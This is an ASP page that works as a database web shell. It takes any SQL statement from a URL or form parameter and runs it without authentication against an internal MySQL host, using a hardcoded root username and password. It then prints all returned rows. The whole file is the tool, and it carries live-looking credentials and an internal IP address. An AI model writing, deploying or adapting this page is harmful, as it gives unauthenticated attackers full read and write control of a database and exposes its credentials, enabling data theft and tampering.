<%
Dim outputDB : outputDB = ""

If Request("sql") <> "" Then

    Dim conn, rs, sql
    sql = Request("sql")

    On Error Resume Next

    Set conn = Server.CreateObject("ADODB.Connection")
    conn.Open "Provider=MSDASQL;Driver={MySQL ODBC 5.3 Unicode Driver};Server=10.10.1.75;Port=3306;Database=flowhcms_hmc;UID=root;PWD=123qwe;"

    If Err.Number <> 0 Then
        outputDB = "DB Connection Error: " & Err.Description
    Else
        Set rs = conn.Execute(sql)

        If Err.Number <> 0 Then
            outputDB = "SQL Error: " & Err.Description
        Else
            outputDB = "<pre>"
            Do Until rs.EOF
                Dim i
                For i = 0 To rs.Fields.Count - 1
                    outputDB = outputDB & rs.Fields(i).Name & ": " & rs.Fields(i).Value & vbCrLf
                Next
                outputDB = outputDB & vbCrLf
                rs.MoveNext
            Loop
            outputDB = outputDB & "</pre>"
        End If

        rs.Close
        conn.Close
    End If

End If
%>

<form method="get">
    SQL Query: <input type="text" name="sql" style="width:500px"/>
    <input type="submit" value="Run SQL"/>
</form>

<%= outputDB %>
